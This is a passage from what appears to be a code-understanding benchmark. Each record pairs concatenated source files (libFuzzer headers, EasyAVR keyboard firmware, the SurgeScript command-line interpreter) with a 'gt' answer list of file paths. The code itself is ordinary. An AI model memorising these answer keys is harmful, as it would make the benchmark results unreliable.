(MutationDispatcher::*Fn)(uint8_t *Data, size_t Size, size_t Max);\n    const char *Name;\n  };\n\n  size_t AddWordFromDictionary(Dictionary &D, uint8_t *Data, size_t Size,\n                               size_t MaxSize);\n  size_t MutateImpl(uint8_t *Data, size_t Size, size_t MaxSize,\n                    Vector<Mutator> &Mutators);\n\n  size_t InsertPartOf(const uint8_t *From, size_t FromSize, uint8_t *To,\n                      size_t ToSize, size_t MaxToSize);\n  size_t CopyPartOf(const uint8_t *From, size_t FromSize, uint8_t *To,\n                    size_t ToSize);\n  size_t ApplyDictionaryEntry(uint8_t *Data, size_t Size, size_t MaxSize,\n                              DictionaryEntry &DE);\n\n  template <class T>\n  DictionaryEntry MakeDictionaryEntryFromCMP(T Arg1, T Arg2,\n                                             const uint8_t *Data, size_t Size);\n  DictionaryEntry MakeDictionaryEntryFromCMP(const Word &Arg1, const Word &Arg2,\n                                             const uint8_t *Data, size_t Size);\n  DictionaryEntry MakeDictionaryEntryFromCMP(const void *Arg1, const void *Arg2,\n                                             const void *Arg1Mutation,\n                                             const void *Arg2Mutation,\n                                             size_t ArgSize,\n                                             const uint8_t *Data, size_t Size);\n\n  Random &Rand;\n  const FuzzingOptions Options;\n\n\n  Dictionary ManualDictionary;\n\n\n  Dictionary TempAutoDictionary;\n\n\n  Dictionary PersistentAutoDictionary;\n\n  Vector<DictionaryEntry *> CurrentDictionaryEntrySequence;\n\n  static const size_t kCmpDictionaryEntriesDequeSize = 16;\n  DictionaryEntry CmpDictionaryEntriesDeque[kCmpDictionaryEntriesDequeSize];\n  size_t CmpDictionaryEntriesDequeIdx = 0;\n\n  const Unit *CrossOverWith = nullptr;\n  Vector<uint8_t> MutateInPlaceHere;\n  Vector<uint8_t> MutateWithMaskTemp;\n\n\n  Vector<uint8_t> CustomCrossOverInPlaceHere;\n\n  Vector<Mutator> Mutators;\n  Vector<Mutator> DefaultMutators;\n  Vector<Mutator> CurrentMutatorSequence;\n};\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_UTIL_H\n#define LLVM_FUZZER_UTIL_H\n\n#include \"FuzzerBuiltins.h\"\n#include \"FuzzerBuiltinsMsvc.h\"\n#include \"FuzzerCommand.h\"\n#include \"FuzzerDefs.h\"\n\nnamespace fuzzer {\n\nvoid PrintHexArray(const Unit &U, const char *PrintAfter = \"\");\n\nvoid PrintHexArray(const uint8_t *Data, size_t Size,\n                   const char *PrintAfter = \"\");\n\nvoid PrintASCII(const uint8_t *Data, size_t Size, const char *PrintAfter = \"\");\n\nvoid PrintASCII(const Unit &U, const char *PrintAfter = \"\");\n\n\n\nbool ToASCII(uint8_t *Data, size_t Size);\n\nbool IsASCII(const Unit &U);\n\nbool IsASCII(const uint8_t *Data, size_t Size);\n\nstd::string Base64(const Unit &U);\n\nvoid PrintPC(const char *SymbolizedFMT, const char *FallbackFMT, uintptr_t PC);\n\nstd::string DescribePC(const char *SymbolizedFMT, uintptr_t PC);\n\nvoid PrintStackTrace();\n\nvoid PrintMemoryProfile();\n\nunsigned NumberOfCpuCores();\n\n\nvoid SetSignalHandler(const FuzzingOptions& Options);\n\nvoid SleepSeconds(int Seconds);\n\nunsigned long GetPid();\n\nsize_t GetPeakRSSMb();\n\nint ExecuteCommand(const Command &Cmd);\n\nFILE *OpenProcessPipe(const char *Command, const char *Mode);\n\nconst void *SearchMemory(const void *haystack, size_t haystacklen,\n                         const void *needle, size_t needlelen);\n\nstd::string CloneArgsWithoutX(const Vector<std::string> &Args,\n                              const char *X1, const char *X2);\n\ninline std::string CloneArgsWithoutX(const Vector<std::string> &Args,\n                                     const char *X) {\n  return CloneArgsWithoutX(Args, X, X);\n}\n\ninline std::pair<std::string, std::string> SplitBefore(std::string X,\n                                                       std::string S) {\n  auto Pos = S.find(X);\n  if (Pos == std::string::npos)\n    return std::make_pair(S, \"\");\n  return std::make_pair(S.substr(0, Pos), S.substr(Pos));\n}\n\nstd::string DisassembleCmd(const std::string &FileName);\n\nstd::string SearchRegexCmd(const std::string &Regex);\n\nsize_t SimpleFastHash(const uint8_t *Data, size_t Size);\n\ninline uint32_t Log(uint32_t X) { return 32 - Clz(X) - 1; }\n\ninline size_t PageSize() { return 4096; }\ninline uint8_t *RoundUpByPage(uint8_t *P) {\n  uintptr_t X = reinterpret_cast<uintptr_t>(P);\n  size_t Mask = PageSize() - 1;\n  X = (X + Mask) & ~Mask;\n  return reinterpret_cast<uint8_t *>(X);\n}\ninline uint8_t *RoundDownByPage(uint8_t *P) {\n  uintptr_t X = reinterpret_cast<uintptr_t>(P);\n  size_t Mask = PageSize() - 1;\n  X = X & ~Mask;\n  return reinterpret_cast<uint8_t *>(X);\n}\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_DICTIONARY_H\n#define LLVM_FUZZER_DICTIONARY_H\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerIO.h\"\n#include \"FuzzerUtil.h\"\n#include <algorithm>\n#include <limits>\n\nnamespace fuzzer {\n\ntemplate <size_t kMaxSizeT> class FixedWord {\npublic:\n  static const size_t kMaxSize = kMaxSizeT;\n  FixedWord() {}\n  FixedWord(const uint8_t *B, uint8_t S) { Set(B, S); }\n\n  void Set(const uint8_t *B, uint8_t S) {\n    assert(S <= kMaxSize);\n    memcpy(Data, B, S);\n    Size = S;\n  }\n\n  bool operator==(const FixedWord<kMaxSize> &w) const {\n    return Size == w.Size && 0 == memcmp(Data, w.Data, Size);\n  }\n\n  static size_t GetMaxSize() { return kMaxSize; }\n  const uint8_t *data() const { return Data; }\n  uint8_t size() const { return Size; }\n\nprivate:\n  uint8_t Size = 0;\n  uint8_t Data[kMaxSize];\n};\n\ntypedef FixedWord<64> Word;\n\nclass DictionaryEntry {\n public:\n  DictionaryEntry() {}\n  DictionaryEntry(Word W) : W(W) {}\n  DictionaryEntry(Word W, size_t PositionHint) : W(W), PositionHint(PositionHint) {}\n  const Word &GetW() const { return W; }\n\n  bool HasPositionHint() const { return PositionHint != std::numeric_limits<size_t>::max(); }\n  size_t GetPositionHint() const {\n    assert(HasPositionHint());\n    return PositionHint;\n  }\n  void IncUseCount() { UseCount++; }\n  void IncSuccessCount() { SuccessCount++; }\n  size_t GetUseCount() const { return UseCount; }\n  size_t GetSuccessCount() const {return SuccessCount; }\n\n  void Print(const char *PrintAfter = \"\\n\") {\n    PrintASCII(W.data(), W.size());\n    if (HasPositionHint())\n      Printf(\"@%zd\", GetPositionHint());\n    Printf(\"%s\", PrintAfter);\n  }\n\nprivate:\n  Word W;\n  size_t PositionHint = std::numeric_limits<size_t>::max();\n  size_t UseCount = 0;\n  size_t SuccessCount = 0;\n};\n\nclass Dictionary {\n public:\n  static const size_t kMaxDictSize = 1 << 14;\n\n  bool ContainsWord(const Word &W) const {\n    return std::any_of(begin(), end(), [&](const DictionaryEntry &DE) {\n      return DE.GetW() == W;\n    });\n  }\n  const DictionaryEntry *begin() const { return &DE[0]; }\n  const DictionaryEntry *end() const { return begin() + Size; }\n  DictionaryEntry & operator[] (size_t Idx) {\n    assert(Idx < Size);\n    return DE[Idx];\n  }\n  void push_back(DictionaryEntry DE) {\n    if (Size < kMaxDictSize)\n      this->DE[Size++] = DE;\n  }\n  void clear() { Size = 0; }\n  bool empty() const { return Size == 0; }\n  size_t size() const { return Size; }\n\nprivate:\n  DictionaryEntry DE[kMaxDictSize];\n  size_t Size = 0;\n};\n\n\n\n\nbool ParseOneDictionaryEntry(const std::string &Str, Unit *U);\n\n\nbool ParseDictionaryFile(const std::string &Text, Vector<Unit> *Units);\n\n}\n\n#endif\n",
        "gt": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerBuiltinsMsvc.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'"
        ]
    },
    {
        "files": [
            "'EasyAVR/firmware/src/mouse.c'",
            "'EasyAVR/firmware/src/keymap.h'",
            "'EasyAVR/firmware/src/config_keymap.h'"
        ],
        "content": "'EasyAVR/firmware/src/mouse.c'\n:\n\n\n#include <stddef.h>\n#include <stdint.h>\n\n#include \"keymap.h\"\n#include \"nvm.h\"\n#include \"mouse.h\"\n\nint8_t g_mouse_report_X;\nint8_t g_mouse_report_Y;\nuint8_t g_mouse_active;\nuint8_t g_mouse_service;\nuint8_t g_cumulative_count;\nuint8_t g_slot;\nuint8_t g_mouse_multiply;\nuint8_t g_jiggle_count;\n\nvoid init_mouse(void)\n{\n\n\tg_slot = 1;\n}\n\n\nvoid update_mouse(void)\n{\n\tuint16_t total_cycle_request;\n\tint8_t mouse_report;\n\n\tif (g_mouse_req_X || g_mouse_req_Y)\n\t{\n\n\t\tg_mouse_active = 1;\n\n\t\tif (!g_mouse_service)\n\t\t{\n\n\t\t\ttotal_cycle_request = (g_mouse_min_delta + (g_mouse_multiply * g_mouse_delta_mult));\n\t\t\tmouse_report = mouse_cycle(total_cycle_request);\n\n\t\t\tg_mouse_report_X = mouse_report * g_mouse_req_X;\n\t\t\tg_mouse_report_Y = mouse_report * g_mouse_req_Y;\n\n\t\t\tg_mouse_service = 1;\n\t\t}\n\t} else {\n\n\t\tif (g_mouse_active)\n\t\t\tg_mouse_service = 1;\n\n\t\tg_mouse_active = 0;\n\t\tg_cumulative_count = 0;\n\t\tg_mouse_report_X = 0;\n\t\tg_mouse_report_Y = 0;\n\n\t\tg_slot = MOUSE_CYCLES;\n\t}\n\n\tif (!g_mouse_active && g_keepawake_flag)\n\t{\n\t\tswitch (g_jiggle_count)\n\t\t{\n\t\tcase 0:\n\t\t\tif (!g_mouse_service)\n\t\t\t{\n\t\t\t\tg_mouse_report_X = 0;\n\t\t\t\tg_mouse_service = 1;\n\t\t\t\tg_jiggle_count--;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 1:\n\t\t\tif (!g_mouse_service)\n\t\t\t{\n\t\t\t\tg_mouse_report_X = -1;\n\t\t\t\tg_mouse_service = 1;\n\t\t\t\tg_jiggle_count--;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tif (!g_mouse_service)\n\t\t\t{\n\t\t\t\tg_mouse_report_X = 1;\n\t\t\t\tg_mouse_service = 1;\n\t\t\t\tg_jiggle_count--;\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\n\t\t\tg_jiggle_count--;\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\n\nint8_t mouse_cycle(uint16_t total_cycle_request)\n{\n\tuint8_t cumulative_request;\n\tint8_t request;\n\n\n\tcumulative_request = (uint8_t)((total_cycle_request * g_slot) / MOUSE_CYCLES);\n\n\trequest = (int8_t)(cumulative_request - g_cumulative_count);\n\n\tg_cumulative_count += request;\n\n\tif (++g_slot > MOUSE_CYCLES)\n\t{\n\t\tg_cumulative_count = 0;\n\t\tg_slot = 1;\n\t}\n\n\treturn request;\n}\n\n'EasyAVR/firmware/src/keymap.h'\n:\n\n\n#ifndef KEYMAP_H_\n#define KEYMAP_H_\n\n#include <stddef.h>\n#include <stdint.h>\n\n#include \"config_keymap.h\"\n\n\n#define HID_ROLLOVER_SIZE (6)\n\n#if defined (BOARD_SIZE_COSTAR) && defined (__AVR_ATmega32U2__)\n#define KEYMAP_MEMORY_SAVE\n#endif\n\ntypedef struct {\n\tconst uint8_t scancode;\n\tconst uint8_t mask;\n} mod_map_t;\n\ntypedef struct {\n\tconst uint8_t numcode;\n\tconst uint8_t navcode;\n} kp_map_t;\n\ntypedef enum {\n\tSC_CLASS_FN,\n\tSC_CLASS_MOD,\n\tSC_CLASS_MACRO,\n\tSC_CLASS_MOUSE,\n\tSC_CLASS_MEDIA,\n\tSC_CLASS_SPEC,\n\tSC_CLASS_NORM,\n\tSC_CLASS_NULL\n} sc_class_t;\n\nextern uint8_t g_modifier_state;\nextern uint8_t g_report_buffer[HID_ROLLOVER_SIZE+1];\nextern uint8_t g_modifier_service;\nextern uint8_t g_alphanum_service;\nextern uint8_t g_media_service;\nextern uint8_t g_power_service;\nextern uint8_t g_mousebutton_state;\nextern int8_t g_mouse_req_X;\nextern int8_t g_mouse_req_Y;\nextern uint16_t g_media_key;\nextern uint8_t g_powermgmt_field;\nextern uint8_t g_hid_lock_flags;\nextern uint8_t g_keepawake_flag;\nextern uint8_t g_winlock_flag;\n#ifdef MACRO_RAM_SIZE\nextern uint16_t g_ram_macro[MACRO_RAM_SIZE];\nuint8_t g_ram_macro_ptr;\nuint8_t g_ram_macro_length;\n#endif\n\nvoid enqueue_key(const uint8_t code);\nvoid delete_key(const uint8_t code);\nvoid toggle_key(const uint8_t code);\nvoid enqueue_fn(const uint8_t code);\nvoid delete_fn(const uint8_t code);\nvoid set_media(const uint8_t code);\nvoid unset_media(const uint8_t code);\nvoid set_power(const uint8_t code);\nvoid unset_power(void);\nvoid init_keymap(void);\nvoid doubletap_down(const uint8_t row, const uint8_t col, const int16_t idle_time);\nvoid doubletap_up(const uint8_t row, const uint8_t col, const int16_t hold_time, uint8_t * const tap);\nvoid record_stroke(const uint8_t code);\nvoid play_macro(const uint8_t code);\nvoid led_fn_activate(const uint8_t bit);\nvoid led_fn_deactivate(const uint8_t bit);\nvoid fn_down(const uint8_t code, const uint8_t action);\nvoid fn_up(const uint8_t code, const uint8_t action, const uint8_t tapkey, const uint8_t tap);\nvoid mod_down(const uint8_t code, const uint8_t action);\nvoid mod_up(const uint8_t code, const uint8_t action, const uint8_t tapkey, const uint8_t tap);\nvoid alpha_down(const uint8_t code, const uint8_t action);\nvoid alpha_up(const uint8_t code, const uint8_t action, const uint8_t tap);\nvoid handle_code_actuate(const uint8_t code, uint8_t action, const uint8_t wmods);\nvoid handle_code_deactuate(const uint8_t code, uint8_t action, const uint8_t wmods, const uint8_t tap);\nuint8_t translate_code(uint8_t code);\nvoid keymap_actuate(const uint8_t row, const uint8_t col, const int16_t hold_time);\nvoid keymap_deactuate(const uint8_t row, const uint8_t col, const int16_t hold_time);\nvoid keymap_interrupt(const uint8_t row, const uint8_t col);\nvoid get_keyboard_report(uint8_t * const buffer);\nvoid get_nkro_report(uint8_t * const buffer);\nvoid get_modifier_report(uint8_t * const buffer);\nvoid initial_actuate(const uint8_t row, const uint8_t col);\n\n#endif\n'EasyAVR/firmware/src/config_keymap.h'\n:\n\n\n#ifndef CONFIG_KEYMAP_H_\n#define CONFIG_KEYMAP_H_\n\n#include <stddef.h>\n#include <stdint.h>\n#include <avr/pgmspace.h>\n\n#include <LUFA/Drivers/USB/USB.h>\n\n#include \"matrix.h\"\n\n#define FN_BUFFER_SIZE (4)\n\n\n#define LED_LAYERS_SIZE (5)\n\n\n\n#define SC_WIN_CP_PREV_TRACK 0xB6\n#define SC_WIN_CP_STOP 0xB7\n#define SC_WIN_CP_PLAY_PAUSE 0xCD\n#define SC_WIN_CP_BRIGHT_INC 0x6F\n#define SC_WIN_CP_BRIGHT_DEC 0x70\n#define SC_WIN_CP_MUTE 0xE2\n#define SC_WIN_CP_BASS_BOOST 0xE5\n#define SC_WIN_CP_VOL_INC 0xE9\n#define SC_WIN_CP_VOL_DEC 0xEA\n#define SC_WIN_CP_BASS_INC 0x0152\n#define SC_WIN_CP_BASS_DEC 0x0153\n#define SC_WIN_CP_TREB_INC 0x0154\n#define SC_WIN_CP_TREB_DEC 0x0155\n#define SC_WIN_CP_MEDIA_SEL 0x0183\n#define SC_WIN_CP_MAIL 0x018A\n#define SC_WIN_CP_CALC 0x0192\n#define SC_WIN_CP_MY_COMP 0x0194\n#define SC_WIN_CP_SEARCH 0x0221\n#define SC_WIN_CP_HOME 0x0223\n#define SC_WIN_CP_BACK 0x0224\n#define SC_WIN_CP_FORWARD 0x0225\n#define SC_WIN_CP_WWWSTOP 0x0226\n#define SC_WIN_CP_REFRESH 0x0227\n#define SC_WIN_CP_FAVES 0x022A\n\n#define SC_WIN_GDP_POWER 0x81\n#define SC_WIN_GDP_SLEEP 0x82\n#define SC_WIN_GDP_WAKE 0x83\n\n\n\n\n#define SCANCODE_NEXT_TRACK 0x97\n#define SCANCODE_PREV_TRACK 0x98\n#define SCANCODE_STOP 0x99\n#define SCANCODE_PLAY_PAUSE 0x9A\n#define SCANCODE_BRIGHT_INC 0x9B\n#define SCANCODE_BRIGHT_DEC 0x9C\n#define SCANCODE_MUTE 0x9D\n#define SCANCODE_BASS_BOOST 0x9E\n#define SCANCODE_VOL_INC 0x9F\n#define SCANCODE_VOL_DEC 0xA0\n#define SCANCODE_BASS_INC 0xA1\n#define SCANCODE_BASS_DEC 0xA2\n#define SCANCODE_TREB_INC 0xA3\n#define SCANCODE_TREB_DEC 0xA4\n#define SCANCODE_MEDIA_SEL 0xA5\n#define SCANCODE_MAIL 0xA6\n#define SCANCODE_CALC 0xA7\n#define SCANCODE_MYCOMP 0xA8\n#define SCANCODE_SEARCH 0xA9\n#define SCANCODE_BROWSER 0xAA\n#define SCANCODE_BACK 0xAB\n#define SCANCODE_FORWARD 0xAC\n#define SCANCODE_WWWSTOP 0xAD\n#define SCANCODE_REFRESH 0xAE\n#define SCANCODE_FAVES 0xAF\n\n#define NUMBER_OF_MEDIA_KEYS (25)\n\n\n#define SCANCODE_MOUSE1 0xB1\n#define SCANCODE_MOUSE2 0xB2\n#define SCANCODE_MOUSE3 0xB3\n#define SCANCODE_MOUSE4 0xB4\n#define SCANCODE_MOUSE5 0xB5\n#define SCANCODE_MOUSEXR 0xB6\n#define SCANCODE_MOUSEXL 0xB7\n#define SCANCODE_MOUSEYU 0xB8\n#define SCANCODE_MOUSEYD 0xB9\n\n#define NUMBER_OF_MOUSE_BUTTONS (5)\n\n#define SCANCODE_POWER 0xBD\n#define SCANCODE_SLEEP 0xBE\n#define SCANCODE_WAKE 0xBF\n\n#define SCANCODE_BL_DIMMER 0xC1\n#define SCANCODE_BL_MODE 0xC2\n#define SCANCODE_BL_ENABLE 0xC3\n#define SCANCODE_KEEPAWAKE 0xC7\n#define SCANCODE_KEYLOCK 0xC8\n#define SCANCODE_WINLOCK 0xC9\n#define SCANCODE_ESCGRAVE 0xCA\n#define SCANCODE_MRAM_RECORD 0xCC\n#define SCANCODE_MRAM_PLAY 0xCD\n#define SCANCODE_BOOT 0xCE\n#define SCANCODE_CONFIG 0xCF\n\n#define SCANCODE_M1 0xD0\n#define SCANCODE_M2 0xD1\n#define SCANCODE_M3 0xD2\n#define SCANCODE_M4 0xD3\n#define SCANCODE_M5 0xD4\n#define SCANCODE_M6 0xD5\n#define SCANCODE_M7 0xD6\n#define SCANCODE_M8 0xD7\n#define SCANCODE_M9 0xD8\n#define SCANCODE_M10 0xD9\n#define SCANCODE_M11 0xDA\n#define SCANCODE_M12 0xDB\n#define SCANCODE_M13 0xDC\n#define SCANCODE_M14 0xDD\n#define SCANCODE_M15 0xDE\n#define SCANCODE_M16 0xDF\n\n\n#define SCANCODE_FN0 0xF0\n#define SCANCODE_FN1 0xF1\n#define SCANCODE_FN2 0xF2\n#define SCANCODE_FN3 0xF3\n#define SCANCODE_FN4 0xF4\n#define SCANCODE_FN5 0xF5\n#define SCANCODE_FN6 0xF6\n#define SCANCODE_FN7 0xF7\n#define SCANCODE_FN8 0xF8\n#define SCANCODE_FN9 0xF9\n\n#define NUMBER_OF_LAYERS (10)\n\n#if defined(__AVR_ATmega16U2__)\n#define MACRO_BUFFER_SIZE (512)\n#elif defined(__AVR_AT90USB1286__)\n#define MACRO_BUFFER_SIZE (1024 * 4)\n#else\n#define MACRO_BUFFER_SIZE (1024 * 2)\n#endif\n\n#if defined(__AVR_ATmega32U2__)\n#define MACRO_RAM_SIZE (40)\n#elif defined(__AVR_ATmega32U4__)\n#define MACRO_RAM_SIZE (80)\n#elif defined(__AVR_AT90USB1286__)\n#define MACRO_RAM_SIZE (160)\n#endif\n\n#define NUMBER_OF_MACROS (16)\n\n\n#define ACTION_NORMAL (0x00)\n#define ACTION_TOGGLE (0x01)\n#define ACTION_LOCKABLE (0x02)\n#define ACTION_STICKY (0x04)\n#define ACTION_RAPIDFIRE (0x08)\n#define ACTION_TAPKEY (0x80)\n#define TAPKEY_MASK (0x7F)\n\nextern const uint16_t PROGMEM MACRO_BUFFER[MACRO_BUFFER_SIZE];\nextern const uint8_t PROGMEM LAYERS[NUMBER_OF_LAYERS][NUMBER_OF_ROWS][NUMBER_OF_COLS];\nextern const uint8_t PROGMEM ACTIONS[NUMBER_OF_LAYERS][NUMBER_OF_ROWS][NUMBER_OF_COLS];\nextern const uint8_t PROGMEM WMODS[NUMBER_OF_LAYERS][NUMBER_OF_ROWS][NUMBER_OF_COLS];\nextern const uint8_t PROGMEM LED_LAYERS[LED_LAYERS_SIZE];\n\n#endif\n",
        "gt": [
            "'EasyAVR/firmware/src/config_keymap.h'",
            "'EasyAVR/firmware/src/keymap.h'",
            "'EasyAVR/firmware/src/mouse.c'"
        ]
    },
    {
        "files": [
            "'surgescript/src/main.c'",
            "'surgescript/src/surgescript.h'",
            "'surgescript/src/surgescript/runtime/tag_system.h'"
        ],
        "content": "'surgescript/src/main.c'\n:\n\n#include <surgescript.h>\n#include <locale.h>\n#include <string.h>\n#include <stdio.h>\n#include <time.h>\n#include <limits.h>\n\n\n#if ENABLE_THREADS\n# if __STDC_VERSION__ >= 201112L && !defined(__STDC_NO_THREADS__)\n#  include <threads.h>\n# else\n#  error \"Can't compile the SurgeScript CLI: threads.h is not found on this environment. Please change the environment or disable multithreading.\"\n# endif\n#endif\n\nstatic surgescript_vm_t* make_vm(int argc, char** argv, int* time_limit);\nstatic void run_vm(surgescript_vm_t* vm, int time_limit);\nstatic void destroy_vm(surgescript_vm_t* vm);\nstatic void print(const char* message);\nstatic void crash(const char* message);\nstatic void discard(const char* message);\nstatic void show_help(const char* executable);\nstatic char* read_from_stdin();\n\n#if ENABLE_THREADS\nstatic mtx_t mutex;\nstatic cnd_t cond;\nstatic bool quit, stop;\nstatic int main_loop(void* arg);\nstatic bool timeout(time_t limit);\n#endif\n\n\n#define DEFAULT_TIME_LIMIT 30000\n\n\nint main(int argc, char* argv[])\n{\n    int time_limit = DEFAULT_TIME_LIMIT;\n\n\n    setlocale(LC_ALL, \"en_US.UTF-8\");\n\n\n    surgescript_vm_t* vm = make_vm(argc, argv, &time_limit);\n\n\n    if(vm != NULL) {\n\n\n        run_vm(vm, time_limit);\n\n\n        destroy_vm(vm);\n\n    }\n\n\n    return 0;\n}\n\n\nvoid run_vm(surgescript_vm_t* vm, int time_limit)\n{\n#define show_time_limit_error() \\\n    fprintf(stderr, \"Time limit of %d seconds exceeded.\\n\", time_limit)\n\n#if !ENABLE_THREADS\n\n    uint64_t start_time = surgescript_util_gettickcount();\n    uint64_t end_time = start_time + (uint64_t)time_limit * 1000;\n\n\n    while(surgescript_vm_update(vm)) {\n\n\n        if(surgescript_util_gettickcount() > end_time) {\n            show_time_limit_error();\n            break;\n        }\n\n    }\n\n#else\n\n\n    struct timespec ts;\n    timespec_get(&ts, TIME_UTC);\n    ts.tv_sec += time_limit;\n    time_t limit = ts.tv_sec;\n\n    quit = stop = false;\n    mtx_init(&mutex, mtx_timed);\n    cnd_init(&cond);\n\n\n    thrd_t thread;\n    thrd_create(&thread, main_loop, vm);\n\n\n    mtx_lock(&mutex);\n    while(!quit && !timeout(limit))\n        cnd_timedwait(&cond, &mutex, &ts);\n    mtx_unlock(&mutex);\n\n\n    if(timeout(limit)) {\n        show_time_limit_error();\n\n\n        mtx_lock(&mutex);\n        stop = true;\n        mtx_unlock(&mutex);\n        thrd_join(thread, NULL);\n    }\n\n\n    cnd_destroy(&cond);\n    mtx_destroy(&mutex);\n\n#endif\n\n#undef show_time_limit_error\n}\n\n\nvoid destroy_vm(surgescript_vm_t* vm)\n{\n    surgescript_vm_destroy(vm);\n}\n\n#if ENABLE_THREADS\n\n\nint main_loop(void* arg)\n{\n    surgescript_vm_t* vm = (surgescript_vm_t*)arg;\n    bool end = false;\n\n    while(!end && surgescript_vm_update(vm)) {\n        mtx_lock(&mutex);\n        end = stop;\n        mtx_unlock(&mutex);\n\n        thrd_yield();\n    }\n\n    mtx_lock(&mutex);\n    quit = true;\n    cnd_broadcast(&cond);\n    mtx_unlock(&mutex);\n\n    return 0;\n}\n\n\nbool timeout(time_t limit)\n{\n    struct timespec ts;\n    timespec_get(&ts, TIME_UTC);\n    return ts.tv_sec > limit;\n}\n\n#endif\n\n\nsurgescript_vm_t* make_vm(int argc, char** argv, int* time_limit)\n{\n    surgescript_vm_t* vm = NULL;\n    int i;\n\n\n    surgescript_util_set_error_functions(discard, crash);\n\n\n    for(i = 1; i < argc && *argv[i] == '-'; i++) {\n        const char* arg = argv[i];\n        if(strcmp(arg, \"--debug\") == 0 || strcmp(arg, \"-D\") == 0) {\n\n            surgescript_util_set_error_functions(print, crash);\n        }\n        else if(strcmp(arg, \"--version\") == 0 || strcmp(arg, \"-v\") == 0) {\n\n            printf(\"%s\\n\", surgescript_util_version());\n            return NULL;\n        }\n        else if(strcmp(arg, \"--help\") == 0 || strcmp(arg, \"-h\") == 0) {\n\n            show_help(surgescript_util_basename(argv[0]));\n            return NULL;\n        }\n        else if(strcmp(arg, \"--timelimit\") == 0 || strcmp(arg, \"-t\") == 0) {\n\n            if(++i < argc && time_limit != NULL) {\n                int seconds = atoi(argv[i]);\n                *time_limit = (seconds > 0) ? seconds : INT_MAX;\n            }\n        }\n        else if(strcmp(arg, \"--\") == 0) {\n\n            break;\n        }\n        else {\n\n            fprintf(stderr, \"Unrecognized option: '%s'.\\nType '%s --help' for more information.\\n\", arg, surgescript_util_basename(argv[0]));\n            return NULL;\n        }\n    }\n\n\n    vm = surgescript_vm_create();\n\n\n    if(i < argc && strcmp(argv[i], \"--\") != 0) {\n\n        for(; i < argc && strcmp(argv[i], \"--\") != 0; i++) {\n            const char* file = argv[i];\n            surgescript_vm_compile(vm, file);\n        }\n    }\n    else {\n        fprintf(stderr, \"Reading from stdin... Run '%s -h' for help.\\n\", surgescript_util_basename(argv[0]));\n\n\n        char* code = read_from_stdin();\n        surgescript_vm_compile_code_in_memory(vm, code);\n        ssfree(code);\n    }\n\n\n    if(i < argc && strcmp(argv[i], \"--\") == 0) {\n\n        ++i;\n        surgescript_vm_launch_ex(vm, argc - i, (char**)(argv + i));\n    }\n    else {\n\n        surgescript_vm_launch(vm);\n    }\n\n\n    return vm;\n}\n\n\nvoid show_help(const char* executable)\n{\n    printf(\n        \"SurgeScript version %s\\n\"\n        \"Copyright (C) %s %s\\n\"\n        \"%s\\n\"\n        \"\\n\"\n        \"Usage: %s [OPTIONS] <scripts>\\n\"\n        \"Compiles and executes the given script(s).\\n\"\n        \"\\n\"\n        \"Options:\\n\"\n        \"    -v, --version                         shows the version of SurgeScript\\n\"\n        \"    -D, --debug                           prints debugging information\\n\"\n        \"    -t, --timelimit                       sets a maximum execution time, in seconds (0 = no limit)\\n\"\n        \"    -h, --help                            shows this message\\n\"\n        \"\\n\"\n        \"Examples:\\n\"\n        \"    %s script.ss                 compiles and executes script.ss\\n\"\n        \"    %s file1.ss file2.ss         compiles and executes file1.ss and file2.ss\\n\"\n        \"    %s --debug test.ss           compiles and runs test.ss with debugging information\\n\"\n        \"    %s file.ss -- -x -y          passes custom arguments -x and -y to file.ss\\n\"\n        \"    %s -t 5                      runs a script read from stdin, with a time limit of 5 seconds\\n\"\n        \"\\n\"\n        \"Full documentation available at: <%s>\\n\",\n        surgescript_util_version(),\n        surgescript_util_years(),\n        surgescript_util_author(),\n        surgescript_util_website(),\n        executable,\n        executable,\n        executable,\n        executable,\n        executable,\n        executable,\n        surgescript_util_website()\n    );\n}\n\n\nvoid print(const char* message)\n{\n    puts(message);\n}\n\n\nvoid crash(const char* message)\n{\n    fprintf(stderr, \"%s\\n\", message);\n    exit(1);\n}\n\n\nvoid discard(const char* message)\n{\n    ;\n}\n\n\nchar* read_from_stdin()\n{\n    const size_t BUFSIZE = 1024;\n    char* data = NULL;\n    size_t read_chars = 0, data_size = 0;\n\n\n    do {\n        data_size += BUFSIZE;\n        data = ssrealloc(data, data_size + 1);\n        read_chars += fread(data + read_chars, sizeof(char), BUFSIZE, stdin);\n        data[read_chars] = '\\0';\n    } while(read_chars == data_size);\n\n\n    return data;\n}\n\n'surgescript/src/surgescript.h'\n:\n\n#ifndef _SURGESCRIPT_H\n#define _SURGESCRIPT_H\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#include \"surgescript/runtime/vm.h\"\n#include \"surgescript/runtime/program.h\"\n#include \"surgescript/runtime/object.h\"\n#include \"surgescript/runtime/program_pool.h\"\n#include \"surgescript/runtime/object_manager.h\"\n#include \"surgescript/runtime/tag_system.h\"\n#include \"surgescript/runtime/vm_time.h\"\n#include \"surgescript/runtime/heap.h\"\n#include 